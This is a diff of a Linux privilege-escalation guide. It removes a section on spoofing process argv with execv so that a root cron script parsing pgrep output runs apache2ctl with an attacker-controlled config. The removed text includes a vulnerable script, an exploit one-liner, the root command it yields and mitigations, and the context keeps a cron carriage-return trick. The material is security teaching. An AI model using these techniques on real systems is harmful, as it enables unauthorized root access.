@@ -452,55 +452,6 @@ It's possible to create a cronjob **putting a carriage return after a comment** 
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
 
-### pgrep/ps argv spoofing in privileged cron scripts
-
-If a root cron/systemd timer script constructs commands from untrusted process listings, you can often escalate privileges by forging a process argv that the script consumes.
-
-Vulnerable pattern (real-world example simplified):
-
-```bash
-#!/usr/bin/bash
-RET=0
-while read pid _cmd ; do
-  # Replace apache2 with apache2ctl and add -t for test
-  cmd="${_cmd/apache2/apache2ctl} -t"
-  $cmd >/dev/null 2>&1
-  RET=$?
-done <<< $(/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")
-exit $RET
-```
-
-Why vulnerable
-- pgrep -lfa prints PID and full command line of matching processes. Any user can spawn a process whose argv[0] matches the regex.
-- The script performs naive string substitution and then executes the resulting $cmd as root.
-
-Exploit primitive: forge argv with execv
-
-```bash
-# Make a fake process whose argv[0] matches the regex and inject flags we want
-python3 -c 'import os; os.execv("/bin/sleep", ["/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -f /home/me/pwn.conf", "60"])'
-# Verify it shows up as intended
-pgrep -lfa apache2
-```
-
-The cron will then run, as root, something like:
-
-```bash
-/opt/zroweb/sbin/apache2ctl -k start -d /opt/zroweb/conf -f /home/me/pwn.conf -t
-```
-
-From primitive to root
-- Use -f /path/to/attacker.conf to point apache2ctl to a config you fully control; you can also override -d to influence ServerRoot resolution.
-- Craft attacker.conf to leverage Apache behaviors that execute privileged helpers during config parsing/startup (e.g., piped logs or other directives that may spawn programs during validation/startup in your target’s build). This can yield root-level command execution or privileged file writes even if the script runs with -t.
-
-Detection and mitigation
-- Never execute strings built from process listings. Use fixed argv arrays and strict allowlists for both program and arguments.
-- If you must inspect processes, parse safely and avoid substituting and executing arbitrary strings; do not pass untrusted data through the shell.
-- Drop privileges in health-check jobs and test configs as an unprivileged user.
-
-References
-- [HTB Zero write-up showing this abuse and path to root](https://0xdf.gitlab.io/2025/08/12/htb-zero.html)
-
 ## Services
 
 ### Writable _.service_ files
